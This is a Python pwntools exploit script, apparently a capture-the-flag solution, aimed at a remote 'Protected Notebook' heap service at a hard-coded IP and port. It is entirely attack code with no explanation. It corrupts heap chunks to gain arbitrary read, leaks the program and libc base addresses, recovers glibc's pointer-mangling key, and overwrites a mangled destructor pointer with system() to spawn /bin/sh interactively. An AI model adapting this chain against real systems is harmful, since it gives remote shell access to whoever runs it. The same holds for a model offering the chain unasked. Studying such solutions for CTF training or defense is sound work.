#!/usr/bin/env python
# coding: utf-8

from pwn import *

p = remote('111.186.63.209', 6666)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc = {
	'base': 0x0,
	'__libc_start_main': 0x21ab0,
	'dtors': 0x3ece18,
	'system': 0x4f440,
	'attr_mangled': 0x3F0740
}

elf = {
	'base': 0x0,
	'leaked': 0x114ab0,
	'start_main_got': 0x347F58,
	'free_hook': 0x7AE140,
	'attr_got': 0x347E60,
}

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base

ru('Protected Notebook')

def add(sz, payload, ID):
	ru('Choice: ')
	sel('1')
	ru('Size: ')
	sel(str(sz))
	ru('Content: ')
	se(payload)
	ru('ID: ')
	sel(str(ID))

def show(idx):
	ru('Choice: ')
	sel('2')
	ru('Index: ')
	sel(str(idx))

def update(idx, payload, ID):
	ru('Choice: ')
	sel('3')
	ru('Index: ')
	sel(str(idx))
	ru('Content: ')
	se(payload)
	ru('ID: ')
	sel(str(ID))

def delete(idx):
	ru('Choice: ')
	sel('4')
	ru('Index: ')
	sel(str(idx))

def secret(addr):
	ru('Choice: ')
	sel('666')
	ru('Lucky Number: ')
	sel(str(addr))

def ptr_mangle(addr, key):
	return rol(addr ^ key, 17, 64)

def key_from_before_after(before_mangle, after_mangle):
	return ror(after_mangle, 17, 64) ^ before_mangle

target = 0xc047fff8004

add(16, 'Lotus33\n', 0x777788889999aaaa)
secret(target)

update(0, 'Lotus337', 0x777788889999aaaa)
update(0, 'B' * 18, 0xccccdddd)

payload = 'A' * 0x10 + '\x02' + '\0' * 0x2 + '\n'
ID = u64('\xff\xff\xff\x02\x00\x00\x00\x30')
update(0, payload, ID)

delete(0)
add(16, 'Lotus33\n', 0x1234567887654321)

leak_pie = 0x602000000018
update(1, p64(leak_pie)[:6]+'\n', 0)

show(0)
ru('Content: ')
leaked = pick64(rud('\n'))
set_base(elf, 'leaked', leaked)
print('[+] ELF base @ {:#x}'.format(elf['base']))

update(1, 'AA', 0x4141414141414141)
update(1, p64(elf['start_main_got'])[:6]+'\n', 0)
show(0)

ru('Content: ')
leaked = pick64(rud('\n'))
set_base(libc, '__libc_start_main', leaked)
print('[+] LIBC base @ {:#x}'.format(libc['base']))

update(1, p64(elf['attr_got'])[:6]+'\n', 0)
show(0)
ru('Content: ')
attr = pick64(rud('\n'))
print('[+] attr @ {:#x}'.format(attr))

update(1, p64(libc['attr_mangled'])[:6]+'\n', 0)
show(0)
ru('Content: ')
mangled = pick64(rud('\n'))
print('[+] mangled = {:#x}'.format(mangled))

key = key_from_before_after(attr, mangled)
print('[+] key = {:#x}'.format(key))

system = ptr_mangle(libc['system'], key)

update(1, 'AAAAAAA', 0x4242424243434343)
update(1, p64(libc['dtors'])+p64(elf['leaked'])[:6]+'\n', 0)

add(0x100, '\0' * 0xc0 + '/bin/sh\0\n', 0)
binsh = 0x611000000100

update(0, p64(system)+'\n', binsh>>8)

p.interactive()